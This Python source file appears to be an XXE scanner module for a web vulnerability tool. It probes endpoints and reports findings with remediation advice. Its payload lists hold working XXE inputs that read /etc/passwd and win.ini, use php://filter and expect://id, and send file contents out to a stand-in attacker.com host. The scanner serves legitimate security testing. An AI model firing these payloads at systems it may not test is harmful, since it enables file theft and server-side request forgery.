"""
XXE (XML External Entity) scanner for detecting XML injection vulnerabilities.
"""

import re
import urllib.parse
from typing import Dict, List, Optional

import httpx

from ..models import Finding, Severity, Confidence


class XXEScanner:
    """Scanner for XML External Entity (XXE) vulnerabilities."""
    
    # XML parsing error patterns that indicate XXE processing
    XXE_ERROR_PATTERNS = [
        r'XMLStreamException',
        r'SAXParseException',
        r'ParserError',
        r'xml\.parsers\.expat',
        r'lxml\.etree\.XMLSyntaxError',
        r'org\.xml\.sax',
        r'javax\.xml\.stream',
        r'com\.sun\.org\.apache\.xerces',
        r'External\s+entity\s+not\s+allowed',
        r'DOCTYPE\s+is\s+disallowed',
        r'Entity\s+declaration\s+not\s+allowed',
        r'XML\s+document\s+structures\s+must\s+start\s+and\s+end',
        r'Content\s+is\s+not\s+allowed\s+in\s+prolog',
        r'Element\s+or\s+attribute\s+do\s+not\s+match',
    ]
    
    # XXE payloads for different attack types
    XXE_PAYLOADS = [
        # Basic XXE to read /etc/passwd
        (
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
            "root:x:0:0:"
        ),
        # Windows variant
        (
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
<foo>&xxe;</foo>""",
            "for 16-bit app support"
        ),
        # PHP filter wrapper
        (
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>""",
            "cm9vdDp4OjA6MDo"
        ),
        # Error-based XXE
        (
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % evil "<!ENTITY xxe SYSTEM 'http://attacker.com/?%xxe;'>">
%evil;
]>
<foo>&xxe;</foo>""",
            None
        ),
        # Blind XXE (out-of-band)
        (
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xxe-test.attacker.com/">
%xxe;
]>
<foo>test</foo>""",
            None
        ),
        # Parameter entity for blind XXE
        (
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo>&send;</foo>""",
            None
        ),
        # SVG XXE
        (
            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="expect://id" />
</svg>""",
            None
        ),
        # XXE via XInclude
        (
            """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",
            "root:x:0:0:"
        ),
    ]
    
    # Simple XML payloads to test if endpoint accepts XML
    PROBE_PAYLOADS = [
        '<?xml version="1.0"?><test>test</test>',
        '<test>test</test>',
        '<?xml version="1.0" encoding="UTF-8"?><root>test</root>',
    ]
    
    # Content types that indicate XML processing
    XML_CONTENT_TYPES = [
        'application/xml',
        'text/xml',
        'application/soap+xml',
        'application/xhtml+xml',
        'application/atom+xml',
        'application/rss+xml',
    ]
    
    def __init__(self, client: httpx.AsyncClient):
        self.client = client
    
    def _detect_xxe_error(self, response_text: str) -> Optional[str]:
        """Detect XXE-related errors in response."""
        for pattern in self.XXE_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None
    
    def _is_xml_endpoint(self, response: httpx.Response) -> bool:
        """Check if endpoint appears to accept XML based on response headers."""
        content_type = response.headers.get('content-type', '').lower()
        
        for xml_type in self.XML_CONTENT_TYPES:
            if xml_type in content_type:
                return True
        
        # Check if response contains XML
        if response.text.strip().startswith('<?xml') or \
           response.text.strip().startswith('<'):
            return True
        
        return False
    
    async def _probe_xml_support(self, url: str, method: str = "POST") -> bool:
        """Probe if endpoint accepts XML input."""
        for payload in self.PROBE_PAYLOADS:
            try:
                response = await self.client.post(
                    url,
                    content=payload,
                    headers={'Content-Type': 'application/xml'},
                    follow_redirects=True
                )
                
                # If we don't get a 400/415, it might accept XML
                if response.status_code not in (400, 415, 422):
                    return True
                    
            except Exception:
                continue
        
        return False
    
    async def _test_xxe_injection(self, url: str, method: str = "POST") -> Optional[Finding]:
        """Test for XXE injection vulnerabilities."""
        
        for payload, indicator in self.XXE_PAYLOADS:
            try:
                response = await self.client.post(
                    url,
                    content=payload,
                    headers={'Content-Type': 'application/xml'},
                    follow_redirects=True,
                    timeout=10.0
                )
                
                # Check for file content in response
                if indicator and indicator in response.text:
                    return Finding(
                        title="XML External Entity (XXE) Injection",
                        description="XXE vulnerability detected. The application processes external entities "
                                   "in XML input, allowing file disclosure and potentially SSRF attacks.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="xxe_injection",
                        evidence=f"File content detected: {indicator[:50]}...",
                        remediation="Disable external entity processing in your XML parser. "
                                   "Use secure XML parsers like defusedxml in Python. "
                                   "Configure the parser to disallow DOCTYPE declarations. "
                                   "Validate and sanitize all XML input.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                            "https://portswigger.net/web-security/xxe",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        ],
                        payload=payload.strip(),
                    )
                
                # Check for XXE-related errors
                error = self._detect_xxe_error(response.text)
                if error:
                    return Finding(
                        title="XML External Entity (XXE) Injection - Possible",
                        description="XXE vulnerability likely exists. XML parsing errors indicate "
                                   "the application processes XML with potential entity expansion.",
                        severity=Severity.HIGH,
                        confidence=Confidence.MEDIUM,
                        target=url,
                        finding_type="xxe_injection_possible",
                        evidence=f"XML error: {error}",
                        remediation="Disable external entity processing in your XML parser. "
                                   "Use secure XML configuration.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                            "https://portswigger.net/web-security/xxe",
                        ],
                        payload=payload.strip(),
                    )
                    
            except httpx.TimeoutException:
                # Timeout might indicate successful external entity resolution
                return Finding(
                    title="XML External Entity (XXE) Injection - Possible (Timeout)",
                    description="XXE vulnerability possible. Request timed out, which may indicate "
                               "the application attempted to resolve an external entity.",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.LOW,
                    target=url,
                    finding_type="xxe_injection_timeout",
                    evidence="Request timeout after sending XXE payload",
                    remediation="Disable external entity processing. "
                               "Configure proper timeouts for external resource fetching.",
                    references=[
                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                    ],
                    payload=payload.strip(),
                )
            except Exception:
                continue
        
        return None
    
    async def _test_xxe_in_url_param(self, url: str, param: str) -> Optional[Finding]:
        """Test for XXE via URL parameters (less common but possible)."""
        
        xxe_param_payloads = [
            ('file:///etc/passwd', 'root:x:0:0:'),
            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'cm9vdDp4OjA6MDo'),
        ]
        
        for payload, indicator in xxe_param_payloads:
            try:
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = payload
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                
                response = await self.client.get(test_url, follow_redirects=True)
                
                if indicator in response.text:
                    return Finding(
                        title="XML External Entity (XXE) via URL Parameter",
                        description=f"XXE vulnerability detected in URL parameter '{param}'. "
                                   f"The application appears to process file paths from user input.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="xxe_url_parameter",
                        evidence=f"File content detected: {indicator[:50]}...",
                        remediation="Validate and sanitize all file path inputs. "
                                   "Use allowlists for permitted file paths. "
                                   "Never pass user input directly to file operations.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                        ],
                        parameter=param,
                        payload=payload,
                    )
                    
            except Exception:
                continue
        
        return None
    
    async def scan_url(self, url: str, parameters: Optional[List[str]] = None) -> List[Finding]:
        """Scan a URL for XXE vulnerabilities."""
        findings = []
        
        # First, check if endpoint accepts XML
        if await self._probe_xml_support(url):
            finding = await self._test_xxe_injection(url)
            if finding:
                findings.append(finding)
        
        # Also test URL parameters for XXE-like behavior
        if parameters is None:
            parsed = urllib.parse.urlparse(url)
            parameters = list(urllib.parse.parse_qs(parsed.query).keys())
        
        for param in parameters:
            finding = await self._test_xxe_in_url_param(url, param)
            if finding:
                findings.append(finding)
        
        return findings
    
    async def scan_endpoint(self, url: str) -> List[Finding]:
        """Scan an API endpoint specifically for XXE."""
        findings = []
        
        # Check if endpoint is XML-based
        try:
            response = await self.client.get(url, follow_redirects=True)
            
            if self._is_xml_endpoint(response):
                finding = await self._test_xxe_injection(url)
                if finding:
                    findings.append(finding)
                    
        except Exception:
            pass
        
        return findings
    
    async def scan_file_upload(self, url: str, file_param: str = "file") -> List[Finding]:
        """Scan file upload endpoints for XXE via SVG or other XML-based files."""
        findings = []
        
        # SVG with XXE payload
        svg_xxe = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""
        
        try:
            files = {file_param: ('test.svg', svg_xxe, 'image/svg+xml')}
            response = await self.client.post(url, files=files, follow_redirects=True)
            
            if 'root:x:0:0:' in response.text:
                findings.append(Finding(
                    title="XXE via SVG File Upload",
                    description="XXE vulnerability detected in SVG file upload. "
                               "The application processes external entities in uploaded SVG files.",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    target=url,
                    finding_type="xxe_svg_upload",
                    evidence="File content from /etc/passwd detected in response",
                    remediation="Disable external entity processing in SVG/XML parsers. "
                               "Validate uploaded files and sanitize XML content. "
                               "Consider using secure image processing libraries.",
                    references=[
                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                        "https://portswigger.net/web-security/xxe",
                    ],
                    payload="SVG with XXE payload",
                ))
                
        except Exception:
            pass
        
        return findings
